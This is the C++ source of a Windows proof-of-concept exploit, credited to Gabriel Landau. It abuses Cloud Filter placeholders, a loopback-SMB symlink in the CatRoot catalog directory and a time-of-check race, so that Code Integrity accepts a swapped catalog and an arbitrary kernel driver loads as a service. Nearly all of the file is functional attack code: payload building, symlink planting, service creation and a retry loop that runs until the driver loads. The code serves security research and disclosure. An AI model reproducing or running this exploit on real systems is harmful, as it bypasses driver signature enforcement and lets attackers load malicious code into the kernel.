// ItsNotASecurityBoundary by Gabriel Landau
// https://twitter.com/GabrielLandau

#include <phnt_windows.h>
#include <phnt.h>
#include <cfapi.h>
#include <pathcch.h>
#include <Shlwapi.h>
#include <comdef.h>

#include "MemoryCommand.h"
#include "Payload.h"
#include "Logging.h"
#include <vector>
#include "PayloadUtils.h"
#include "resource.h"

bool ThawThreads();
bool SlowThreads(ULONG dwProcessId);

CF_CONNECTION_KEY gConnectionKey = { 0, };

std::string gBenignBuf;
std::string gPayloadBuf;
std::string* gpCurrentBuffer = &gBenignBuf;

HANDLE ghPlaceholder = NULL;
LARGE_INTEGER gPlaceholderSize = { 0 };

HANDLE ghSymlink = NULL;

std::vector<HANDLE> gSlowedThreads;
HANDLE ghCoreHogger = NULL;
DECLSPEC_CACHEALIGN volatile DWORD gCoreHoggerShutdownSignal = 0;

static SRWLOCK gCloudCallbackLock = SRWLOCK_INIT;

HANDLE ghCatalogThread = NULL;

ULONGLONG gPatchedRangeStart = 0;
ULONGLONG gPatchedRangeEnd = 0;

std::wstring gDriverServiceName = L"ItsNotASecurityBoundary";
bool gCreateDriverService = true;

// B417F88AB1BE825DC2F3B1B6F1467D65B7F5D232A293160623FF16D72679EFE8 @{Algorithm=SHA256; FileHash=B417F88AB1BE825DC2F3B1B6F1467D65B7F5D232A293160623FF16D72679EFE8; Guid=; PageHashVersion=2; PageHashData=; EnhancedHash=}                                                  {@{Name=OSAttr; Value=2:10.0 }, @{Name=File; Value=amdkmdag.sys }}  
#define AUTHENTIHASH_TO_REPLACE "B417F88AB1BE825DC2F3B1B6F1467D65B7F5D232A293160623FF16D72679EFE8"

#define TEMP_DIR L"C:\\ItsNotASecurityBoundaryTemp\\"
#define PAYLOAD_PATH TEMP_DIR "payload.cat"

#define PLACEHOLDER_DIR TEMP_DIR "SyncRoot\\"
#define PLACEHOLDER_BASENAME L"ItsNotASecurityBoundaryPH.cat"
#define PLACEHOLDER_PATH PLACEHOLDER_DIR  PLACEHOLDER_BASENAME
#define PLACEHOLDER_PATH_SMB L"\\\\127.0.0.1\\C$\\ItsNotASecurityBoundaryTemp\\SyncRoot\\" PLACEHOLDER_BASENAME

#define SYMLINK_BASENAME L"ItsNotASecurityBoundary.cat"
#define SYMLINK_DIR L"C:\\Windows\\System32\\CatRoot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\\"
#define SYMLINK_PATH SYMLINK_DIR SYMLINK_BASENAME

volatile ULONG gActiveSpinThreads = 0;
volatile ULONG gSpinShutdownSignal = 0;
std::vector<HANDLE> ghSpinThreads;

DWORD WINAPI KeepWorkingSetEmptyThread(LPVOID lpParam)
{
    InterlockedIncrement(&gActiveSpinThreads);
    {
        while (!gSpinShutdownSignal) EmptySystemWorkingSet(true);
    }
    InterlockedDecrement(&gActiveSpinThreads);

    return 0;
}


DWORD WINAPI SpinThreadMain(LPVOID lpParam)
{
    InterlockedIncrement(&gActiveSpinThreads);
    {
        while (!gSpinShutdownSignal); // Spin, don't sleep
    }
    InterlockedDecrement(&gActiveSpinThreads);
    
    return 0;
}

void StartCoreWorkerThreads(bool bSpin, bool bWorkingSet)
{
    constexpr size_t KEEP_WS_EMPTY_THREAD_COUNT = 1;
    SYSTEM_INFO systemInfo{};

    // We don't want the spin threads to slow us down, so bump our priority above theirs
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

    gSpinShutdownSignal = 0;

    GetSystemInfo(&systemInfo);
    for (size_t i = 0; i < systemInfo.dwNumberOfProcessors + KEEP_WS_EMPTY_THREAD_COUNT; i++)
    {
        const bool bSpinThread = (i < systemInfo.dwNumberOfProcessors);
        const auto& ThreadRoutine = bSpinThread ? SpinThreadMain : KeepWorkingSetEmptyThread;

        if (bSpinThread && !bSpin) continue;
        if (!bSpinThread && !bWorkingSet) continue;

        HANDLE hThread = CreateThread(NULL, 0, ThreadRoutine, NULL, 0, NULL);
        if (!hThread)
        {
            Log(Error, "StartCoreWorkerThreads: CreateThread failed with GLE %u", GetLastError());
            continue;
        }
        if (bSpinThread)
        {
            SetThreadAffinityMask(hThread, (1ULL << i));
        }
        else
        {
            SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);
        }

        ghSpinThreads.push_back(hThread);
    }

    // Wait for them to all to start up
    while (ghSpinThreads.size() != gActiveSpinThreads)
    {
        Sleep(1);
    }

    Log(Debug, "StartCoreWorkerThreads started %u threads", gActiveSpinThreads);
}

void StopCoreWorkerThreads()
{
    gSpinShutdownSignal = 1;
    for (auto& hThread : ghSpinThreads)
    {
        // Join thread
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    if (0 != gActiveSpinThreads)
    {
        Log(Error, "StopCoreWorkerThreads: Failed to stop all spin threads");
    }

    Log(Debug, "StopCoreWorkerThreads stopped %u threads", ghSpinThreads.size());
    ghSpinThreads.clear();
}

// This is our CloudFilter rehydration callback
VOID CALLBACK FetchDataCallback (
    _In_ CONST CF_CALLBACK_INFO* CallbackInfo,
    _In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters
    )
{
    static volatile LONG sFetchSequenceNumber = 0;
    const ULONG thisSequenceNumber = InterlockedIncrement(&sFetchSequenceNumber);

    NTSTATUS ntStatus = 0;
    HRESULT hRet = S_OK;
    LARGE_INTEGER RequiredFileOffset = CallbackParameters->FetchData.RequiredFileOffset;
    LARGE_INTEGER RequiredLength = CallbackParameters->FetchData.RequiredLength;
    static ULONG sRequestSequence = 0;
    bool bDoingIt = false;

    // Use an SRWLock to synchronize this function
    AcquireSRWLockExclusive(&gCloudCallbackLock);

    Log(Debug, "FetchDataCallback %u called requesting %llu bytes at offset %llu.",
        thisSequenceNumber, RequiredLength, RequiredFileOffset);

    // Read the current file's contents at requested offset into a local buffer
    // This could be either the benign file, or the payload file
    CF_OPERATION_INFO opInfo = { 0, };
    CF_OPERATION_PARAMETERS opParams = { 0, };

    opInfo.StructSize = sizeof(opInfo);
    opInfo.Type = CF_OPERATION_TYPE_TRANSFER_DATA;
    opInfo.ConnectionKey = CallbackInfo->ConnectionKey;
    opInfo.TransferKey = CallbackInfo->TransferKey;

    opParams.ParamSize = sizeof(opParams);
    opParams.TransferData.CompletionStatus = ntStatus;
    opParams.TransferData.Buffer = gpCurrentBuffer->data() + RequiredFileOffset.QuadPart;
    opParams.TransferData.Offset = RequiredFileOffset;
    opParams.TransferData.Length = RequiredLength;
    
    if (gpCurrentBuffer == &gPayloadBuf)
    {
        Log(Debug, "Hydrating %llu PAYLOAD bytes at offset %llu",
            opParams.TransferData.Length.QuadPart,
            opParams.TransferData.Offset.QuadPart);
    }
    else
    {
        Log(Debug, "Hydrating %llu bytes at offset %llu",
            opParams.TransferData.Length.QuadPart,
            opParams.TransferData.Offset.QuadPart);
    }

    // Empty working set right before sending this segment       
    if ((gpCurrentBuffer == &gBenignBuf) &&
        (4 == InterlockedIncrement(&sRequestSequence)))
    {
        StartCoreWorkerThreads(false, true);

        EmptySystemWorkingSet(true);

        bDoingIt = true;
    }

    hRet = CfExecute(&opInfo, &opParams);
    if (!SUCCEEDED(hRet))
    {
        _com_error err(hRet);
        Log(Error, "CfExecute failed with HR 0x%08x: %ws", hRet, err.ErrorMessage());
    }

    ReleaseSRWLockExclusive(&gCloudCallbackLock);

    if (bDoingIt)
    {       
        Log(Debug, "Delivering payload");

        while (true)
        {
            for (const auto& bPayload : { false, true })
            {
                const std::string & buffer = bPayload ? gPayloadBuf : gBenignBuf;

                opParams.TransferData.Buffer = buffer.data() + gPatchedRangeStart;
                opParams.TransferData.Offset.QuadPart = gPatchedRangeStart;
                opParams.TransferData.Length.QuadPart = (gPatchedRangeEnd - gPatchedRangeStart);

                hRet = CfExecute(&opInfo, &opParams);
                if (SUCCEEDED(hRet))
                {
                    // Update timestamp to invalidate CI's cache
                    FILETIME now{};
                    GetSystemTimePreciseAsFileTime(&now);
                    if (!SetFileTime(ghPlaceholder, &now, NULL, &now))
                    {
                        Log(Error, "SetFileTime failed with GLE %u", GetLastError());
                    }
                }
                else
                {
                    //_com_error err(hRet);
                    //Log(Error, "CfExecute failed with HR 0x%08x: %ws", hRet, err.ErrorMessage());
                    Sleep(10);
                }

            }
        }
    }

}

bool FileExists(const std::wstring& path)
{
    return (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(path.c_str()));
}

// Replace HIJACK_DLL_PATH symlink to PLACEHOLDER_DLL_PATH_SMB
bool InstallSymlink()
{
    // Make sure PLACEHOLDER exists
    if (!FileExists(PLACEHOLDER_PATH))
    {
        Log(Error, "InstallSymlink: Placeholder does not exist.  Refusing to install symlink.  GLE: %u", GetLastError());
        return false;
    }

    // Symlink HIJACK => PLACEHOLDER over SMB
    if (!CreateSymbolicLinkW(SYMLINK_PATH, PLACEHOLDER_PATH_SMB, 0))
    //if (!CreateSymbolicLinkW(SYMLINK_PATH, PLACEHOLDER_PATH, 0))
    {
        Log(Error, "InstallSymlink: CreateSymbolicLinkW failed with GLE: %u", GetLastError());
        return false;
    }

    ghSymlink = CreateFileW(SYMLINK_PATH, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    if (INVALID_HANDLE_VALUE == ghSymlink)
    {
        Log(Error, "InstallSymlink: Failed to open symlink with GLE: %u", GetLastError());
        return false;
    }

    return true;
}

// Reverts the changes done by InstallSymlink()
bool CleanupSymlink()
{
    CloseHandle(ghSymlink);

    // Delete symlink
    (void)DeleteFile(SYMLINK_PATH);

    // Delete PLACEHOLDER
    (void)DeleteFile(PLACEHOLDER_PATH);
    
    return true;
}

bool CreateServiceForDriver(std::wstring driverPath, const std::wstring& serviceName)
{
    bool bResult = false;
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM)
    {
        Log(Error, "Failed to open SCM!");
        goto Cleanup;
    }

    // Stop and remove any existing service
    hService = OpenServiceW(hSCM, gDriverServiceName.c_str(), SERVICE_ALL_ACCESS);
    if (hService)
    {
        SERVICE_STATUS status{};

        (void)ControlService(hService, SERVICE_CONTROL_STOP, &status);
            
        if (!DeleteService(hService))
        {
            Log(Info, "DeleteService failed with GLE %u", GetLastError());
            goto Cleanup;
        }
        CloseServiceHandle(hService);
        hService = NULL;
    }

    // https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew
    // If the path contains a space, it must be quoted so that it is correctly interpreted. 
    // For example, "d:\my share\myservice.exe" should be specified as ""d:\my share\myservice.exe"".
    //driverPath = L"\"" + driverPath + L"\"";

    hService = CreateServiceW(hSCM, gDriverServiceName.c_str(), NULL, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, driverPath.c_str(), NULL, NULL, NULL, NULL, NULL);
    if (!hService)
    {
        Log(Info, "CreateServiceW failed with GLE %u", GetLastError());
        goto Cleanup;
    }

    bResult = true;

Cleanup:
    CloseServiceHandle(hSCM);
    CloseServiceHandle(hService);
    return bResult;
}

bool LoadTheDriver()
{
    ULONGLONG startTime = GetTickCount64();
    ULONGLONG endTime = 0;

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM)
    {
        Log(Error, "Failed to open SCM!");
        return false;
    }

    SC_HANDLE hService = OpenServiceW(hSCM, gDriverServiceName.c_str(), SERVICE_ALL_ACCESS);
    if (!hService)
    {
        Log(Error, "Failed to open service!");
        return false;
    }

    SERVICE_STATUS status{};
    ControlService(hService, SERVICE_CONTROL_STOP, &status);

    LogNoNewline(Info, "Attack running");

    for (size_t tryCount = 0; tryCount < 250; tryCount++)
    {
        if (StartServiceW(hService, 0, NULL))
        {
            endTime = GetTickCount64();
            printf("\n");
            Log(Info, "Success!  Service started after %llu ms", endTime - startTime);
            return true;
        }
        else
        {
            const DWORD lastError = GetLastError();
            if (ERROR_INVALID_IMAGE_HASH == lastError)
            {
                printf("."); // printf, don't log

                {
                    // Update timestamp to invalidate CI's cache
                    FILETIME now{};
                    GetSystemTimePreciseAsFileTime(&now);
                    
                    if (!SetFileTime(ghSymlink, &now, NULL, &now))
                    {
                        Log(Error, "SetFileTime failed with GLE %u", GetLastError());
                    }
                }
            }
            else if (ERROR_SERVICE_ALREADY_RUNNING == lastError)
            {
                Log(Info, "StartServiceW failed with ERROR_SERVICE_ALREADY_RUNNING");
                return false;
            }
            else
            {
                Log(Info, "StartServiceW failed with GLE 0x%08x", lastError);
            }
        }
    }

    CfUnregisterSyncRoot(PLACEHOLDER_DIR);
    CleanupSymlink();
    printf("\n");
    Log(Error, "We're sorry, but your princess is in another castle.");
    ExitProcess(1);

    return false;
}

BOOL WINAPI CtrlHandler(DWORD fdwCtrlType)
{
    switch (fdwCtrlType)
    {
    // Handle the CTRL-C signal.
    case CTRL_C_EVENT:
    case CTRL_CLOSE_EVENT:
    case CTRL_BREAK_EVENT:
    case CTRL_LOGOFF_EVENT:
    case CTRL_SHUTDOWN_EVENT:
        CfUnregisterSyncRoot(PLACEHOLDER_DIR);
        CleanupSymlink();
        Log(Error, "Hard stop!");
        ExitProcess(1);

    default:
        return FALSE;
    }
}

int wmain(int argc, wchar_t* argv[])
{
    int result = 1;
    DWORD bytesWritten = 0;
    DWORD ignored = 0;
    HRESULT hRet = S_OK;
    CF_CONNECTION_KEY key = { 0 };
    ULONGLONG startTime = GetTickCount64();
    ULONGLONG endTime = 0;
    BOOLEAN ignore = 0;
    NTSTATUS ntStatus = 0;
   
    while (argc > 2)
    {
        // Handle verbose logging
        if (argc >= 2 && (0 == _wcsicmp(L"-v", argv[1])))
        {
            SetLogLevel(LogLevel::Debug);
            argc--;
            argv++;
        }
        // If there's an existing driver service, don't create/destroy a new one
        if (argc >= 2 && (0 == _wcsicmp(L"--existing-service", argv[1])))
        {
            gCreateDriverService = false;
            argc--;
            argv++;
        }
        // Handle custom service name
        if (argc >= 3 && (0 == _wcsicmp(L"-s", argv[1])))
        {
            gDriverServiceName = argv[2];
            argc-=2;
            argv+=2;
        }
        else
        {
            Log(Error, "Unknown parameter: %ws", argv[1]);
            Log(Error, "Usage: %ws [-v] <DRIVER>", argv[0]);
            return 1;
        }
    }

    if (2 != argc)
    {
        Log(Error, "Usage: %ws [-v] <DRIVER>", argv[0]);
        return 1;
    }

    std::wstring driverPath(32768, '\0');
    driverPath.resize(GetFullPathNameW(argv[1], (DWORD)driverPath.size(), &driverPath[0], NULL));
    if (driverPath.empty() || !FileExists(driverPath.c_str()))
    {
        Log(Error, "Driver does not exist: %ws", driverPath.c_str());
        return 1;
    }
    Log(Info, "Driver full path: %ws", driverPath.c_str());

    // Enable SeProfileSingleProcessPrivilege which is required for SystemMemoryListInformation
    ntStatus = RtlAdjustPrivilege(SE_PROFILE_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &ignore);
    if (0 != ntStatus)
    {
        Log(Error, "Failed to enable SeProfileSingleProcessPrivilege with NTSTATUS 0x%08x", ntStatus);
        return 1;
    }

    ntStatus = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &ignore);
    if (0 != ntStatus)
    {
        Log(Error, "Failed to enable SeDebugPrivilege with NTSTATUS 0x%08x", ntStatus);
        return 1;
    }

    // Clean up from any previous failed runs
    (void)CleanupSymlink();

    // Read embedded catalog into buffer
    gBenignBuf.resize(4 * 1024 * 1024);
    DWORD catalogSize = 0;
    if (!GetCatalog(MAKEINTRESOURCE(RES_PAYLOAD), &gBenignBuf[0], gBenignBuf.size(), catalogSize))
    {
        Log(Error, "Failed to get benign catalog");
        return 1;
    }
    gBenignBuf.resize(catalogSize);

    // Create the payload using the benign file
    if (!BuildPayload(driverPath, gBenignBuf, gPayloadBuf, gPatchedRangeStart, gPatchedRangeEnd, AUTHENTIHASH_TO_REPLACE))
    {
        Log(Error, "Failed to build payload");
        return 1;
    }

    CreateDirectoryW(TEMP_DIR, NULL);
    CreateDirectoryW(PLACEHOLDER_DIR, NULL);

    // CloudFilter APIs based on https://googleprojectzero.blogspot.com/2021/01/windows-exploitation-tricks-trapping.html
    CF_SYNC_REGISTRATION syncReg = { 0 };
    syncReg.StructSize = sizeof(CF_SYNC_REGISTRATION);
    syncReg.ProviderName = L"CloudTest";
    syncReg.ProviderVersion = L"1.0";
    // {119C6523-407B-446B-B0E3-E03011178F50}
    syncReg.ProviderId = { 0x119c6523, 0x407b, 0x446b, { 0xb0, 0xe3, 0xe0, 0x30, 0x11, 0x17, 0x8f, 0x50 } };

    CF_SYNC_POLICIES policies = { 0 };
    policies.StructSize = sizeof(CF_SYNC_POLICIES);
    policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    policies.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
    policies.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
    policies.InSync = CF_INSYNC_POLICY_NONE;
    policies.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
    policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;

    hRet = CfRegisterSyncRoot(PLACEHOLDER_DIR, &syncReg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (!SUCCEEDED(hRet))
    {
        Log(Error, "CfRegisterSyncRoot failed with HR 0x%08x GLE %u", hRet, GetLastError());
        return 1;
    }

    // Connect our callback to the synchronization root
    CF_CALLBACK_REGISTRATION cbReg[2] = {};
    cbReg[0].Callback = FetchDataCallback;
    cbReg[0].Type = CF_CALLBACK_TYPE_FETCH_DATA;
    cbReg[1].Type = CF_CALLBACK_TYPE_NONE;

    hRet = CfConnectSyncRoot(PLACEHOLDER_DIR, cbReg, NULL, CF_CONNECT_FLAG_NONE, &gConnectionKey);
    if (!SUCCEEDED(hRet))
    {
        CfUnregisterSyncRoot(PLACEHOLDER_DIR);
        Log(Error, "CfConnectSyncRoot failed with HR 0x%08x GLE %u", hRet, GetLastError());
        return 1;
    }

    FILETIME ftNow{};
    GetSystemTimePreciseAsFileTime(&ftNow);

    // Create placeholder
    CF_PLACEHOLDER_CREATE_INFO phInfo = { 0, };
    phInfo.FsMetadata.FileSize.HighPart = 0;
    phInfo.FsMetadata.FileSize.LowPart = (DWORD)gBenignBuf.size();
    phInfo.FsMetadata.BasicInfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
    phInfo.FsMetadata.BasicInfo.CreationTime.LowPart = ftNow.dwLowDateTime;
    phInfo.FsMetadata.BasicInfo.CreationTime.HighPart = ftNow.dwHighDateTime;
    phInfo.FsMetadata.BasicInfo.LastWriteTime = phInfo.FsMetadata.BasicInfo.CreationTime;
    phInfo.RelativeFileName = PLACEHOLDER_BASENAME;
    phInfo.Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
    phInfo.FileIdentityLength = 0x130;
    phInfo.FileIdentity = malloc(phInfo.FileIdentityLength);

    DWORD processed = 0;
    hRet = CfCreatePlaceholders(PLACEHOLDER_DIR, &phInfo, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &processed);
    if (!SUCCEEDED(hRet) || (1 != processed))
    {
        CfUnregisterSyncRoot(PLACEHOLDER_DIR);
        Log(Error, "CfCreatePlaceholders failed with HR 0x%08x GLE %u", hRet, GetLastError());
        return 1;
    }

    ghPlaceholder = CreateFileW(
        PLACEHOLDER_PATH, FILE_READ_ATTRIBUTES|FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_FLAG_RANDOM_ACCESS | FILE_FLAG_NO_BUFFERING, NULL);
    if ((INVALID_HANDLE_VALUE == ghPlaceholder) || !GetFileSizeEx(ghPlaceholder, &gPlaceholderSize))
    {
        Log(Error, "Failed to open placeolder with GLE %u", GetLastError());
        return 1;
    }

    if (!SetConsoleCtrlHandler(CtrlHandler, TRUE))
    {
        Log(Error, "SetConsoleCtrlHandler failed with GLE %u", GetLastError());
        return 1;
    }

    // Replace target file with a symlink over loopback SMB to the placeholder file
    if (!InstallSymlink())
    {
        Log(Error, "InstallSymlink failed.  Aborting.");
        return 1;
    }

    if (gCreateDriverService)
    {
        Log(Info, "Creating service.");
        if (!CreateServiceForDriver(driverPath, gDriverServiceName.c_str()))
        {
            Log(Error, "Failed to create service.  Aborting.");
            return 1;
        }
    }

    if (!LoadTheDriver())
    {
        Log(Error, "Failed to load driver.  Aborting.");
        return 1;
    }

    endTime = GetTickCount64();
    Log(Info, "Operation successful after %llu ms.", endTime - startTime);

    result = 0;

    Sleep(100);
    CfUnregisterSyncRoot(PLACEHOLDER_DIR);
    CleanupSymlink();
    
    return result;
}


